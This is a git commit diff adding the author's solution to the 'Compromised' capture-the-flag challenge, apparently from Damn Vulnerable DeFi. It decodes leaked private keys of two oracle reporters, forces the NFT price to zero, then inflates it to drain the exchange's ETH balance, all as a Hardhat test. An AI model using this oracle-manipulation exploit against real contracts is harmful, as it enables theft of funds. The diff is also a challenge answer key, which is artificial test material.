14faf490c6cfdd06d8d303554dc16aa7551ea9fb
ericboris <ericboris@tutanota.com>
2022-10-24 13:52:25 -0700

    add compromised solution

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -61,7 +61,56 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        /* 
+            Vulnerability:
+            The "strange response" represents the raw bytes for the private keys to 2 of the 3 
+            "trusted reporters". These are used by the attacker to gain access to the trusted 
+            reporters, lower the price of the nft to 0, purchase an nft, then raise the price of
+            an nft to the exchange's eth balance, sell the nft for the exchange's balance, and
+            then reset the price of an nft back to it's initial value.
+        */
+
+        // Store the initial nft price so that it can be reset later
+        const initialNftPrice = await this.oracle.getMedianPrice("DVNFT")
+
+        // Convert the "strange response" strings to private keys and then to signers
+        const rawPrivateKey1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
+        const rawPrivateKey2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
+
+        const privateKey1 = rawStringToPrivateKey(rawPrivateKey1) 
+        const privateKey2 = rawStringToPrivateKey(rawPrivateKey2) 
+
+        const signer1 = new ethers.Wallet(privateKey1, ethers.provider)
+        const signer2 = new ethers.Wallet(privateKey2, ethers.provider)
+
+        // Lower the median price of an nft to 0
+        await this.oracle.connect(signer1).postPrice("DVNFT", 0)
+        await this.oracle.connect(signer2).postPrice("DVNFT", 0)
+
+        // Purchase an nft and get it's tokenId
+        const tx = await this.exchange.connect(attacker).buyOne({ value: 1 })
+        const receipt = await tx.wait()
+        const tokenId = receipt.events[1].args.tokenId
+   
+        // Raise the price of an nft to the exchange's eth balance
+        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address)
+
+        await this.oracle.connect(signer1).postPrice("DVNFT", exchangeBalance)
+        await this.oracle.connect(signer2).postPrice("DVNFT", exchangeBalance)
+
+        // Sell the nft back to the exchange and receive the exchange's eth balance
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId)
+        await this.exchange.connect(attacker).sellOne(tokenId)
+
+        // Reset the nft price
+        await this.oracle.connect(signer1).postPrice("DVNFT", initialNftPrice)
+        await this.oracle.connect(signer2).postPrice("DVNFT", initialNftPrice)
     });
+
+    function rawStringToPrivateKey(str) {
+        const base64 = Buffer.from(str.split(" ").join(""), "hex").toString("utf8")
+        return Buffer.from(base64, "base64").toString("utf8")
+    }
 
     after(async function () {
         /** SUCCESS CONDITIONS */
